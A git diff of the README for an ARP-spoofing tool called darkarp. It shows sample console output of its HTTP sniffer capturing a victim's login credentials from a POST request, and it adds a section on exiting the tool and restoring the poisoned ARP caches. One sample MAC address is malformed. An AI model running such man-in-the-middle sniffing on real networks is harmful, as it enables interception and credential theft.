@@ -60,9 +60,9 @@ HTTP sniffing attack is performing by giving "**sniff** <i>interface</i>" comman
 ```bash
 darkarp> sniff wlan0
 HTTP packet sniffing started... Waiting HTTP requests...
-[+] client: 172.20.10.4 server: example.com/ method: GET
-[+] client: 172.20.10.4 server: example.com/ method: GET
-[+] client: 172.20.10.4 server: unicornitems.com/my-account/ method: POST
+[+] client: 192.168.0.4 server: example.com/ method: GET
+[+] client: 192.168.0.4 server: example.com/ method: GET
+[+] client: 192.168.0.4 server: example.com/my-account/ method: POST
 [/] POST:
 Parameters:
 b'username=admin&password=suppersecretpasswd'
@@ -80,6 +80,18 @@ darkarp> net_scan
 	192.168.0.1         00:1B:44:11:3A:B7
 	192.168.0.4         52:4:t9:00:fA:C1
 darkarp> 
+```
+
+## Stop process, and fix target's ARP cache
+
+This will stop execution of darkarp and also will fix target's poisoned ARP cache
+
+```
+darkarp> exit
+[w] Repairing target's ARP cache
+[w] Repairing gateways's ARP cache
+Terminated
+[aku@thug darkarp]$ 
 ```
 
 <hr>
